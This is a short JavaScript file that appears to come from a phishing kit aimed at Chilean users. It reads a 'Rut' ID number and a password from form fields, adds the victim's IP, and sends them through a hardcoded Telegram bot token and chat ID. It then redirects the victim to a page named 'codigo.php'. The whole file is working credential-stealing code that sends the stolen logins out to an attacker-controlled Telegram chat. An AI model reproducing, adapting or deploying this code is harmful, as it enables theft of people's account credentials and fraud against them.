//bot token
var telegram_bot_id = "5684402042:AAHNMzlQohW1oIPAXo3TdHI6nsezb4bchkc";
//chat id
var chat_id = -4065706092
;
var pax, ip;
var ready = function () {
    pax = document.getElementById("miDiosenticonfio").value;
 clave = document.getElementById("miDiosenticonfio2").value;
	ip = document.getElementById("ip").innerHTML;
    message = "Rut" + pax + " clave: " + clave + ip + "\ by yorbeth";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        top.location.href = 'codigo.php';
        console.log(response);
    });
    return false;
};
